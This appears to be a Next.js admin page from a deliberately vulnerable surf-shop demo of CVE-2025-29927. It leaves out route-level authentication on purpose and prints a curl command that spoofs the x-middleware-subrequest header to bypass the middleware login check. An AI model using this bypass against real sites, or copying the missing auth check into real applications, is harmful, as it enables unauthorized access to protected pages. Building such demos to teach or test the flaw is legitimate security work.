import Link from "next/link";

export const metadata = {
  title: "Staff Admin | Jay's Surf Shop",
};

/**
 * Intentionally protected only by middleware (CVE-2025-29927 demo).
 * No route-level auth — bypass proves middleware was skipped.
 */
export default function AdminPage() {
  return (
    <div className="mx-auto max-w-2xl px-4 py-12">
      <p className="text-xs uppercase tracking-widest text-ocean-500 mb-2">Staff only</p>
      <h1 className="font-display text-3xl font-bold text-ocean-900">Ops console</h1>
      <p className="mt-3 text-ocean-700 leading-relaxed">
        This page is gated by Next.js middleware checking the{" "}
        <code className="text-sm bg-ocean-50 px-1 rounded">jss_staff_session</code> cookie.
        On vulnerable Next.js (<code className="text-sm bg-ocean-50 px-1 rounded">15.1.0</code>),
        CVE-2025-29927 lets you reach it without signing in by spoofing{" "}
        <code className="text-sm bg-ocean-50 px-1 rounded">x-middleware-subrequest</code>.
      </p>

      <div className="mt-8 space-y-3 rounded-lg border border-ocean-200 bg-ocean-50/50 p-5 text-sm text-ocean-800">
        <p className="font-semibold text-ocean-900">Synthetic staff data (demo)</p>
        <ul className="list-disc pl-5 space-y-1">
          <li>Open orders: 14 (Harbor pickup)</li>
          <li>Refund queue: 3</li>
          <li>Supplier API key: <code>jss_demo_sk_live_…</code></li>
        </ul>
      </div>

      <p className="mt-6 text-sm text-ocean-600">
        Bypass probe (no cookie):
      </p>
      <pre className="mt-2 overflow-x-auto rounded-lg bg-ocean-950 text-ocean-100 text-xs p-4">
{`curl -si "$ORIGIN/admin" \\
  -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"`}
      </pre>

      <Link href="/" className="mt-8 inline-block text-ocean-700 underline underline-offset-2">
        ← Back to shop
      </Link>
    </div>
  );
}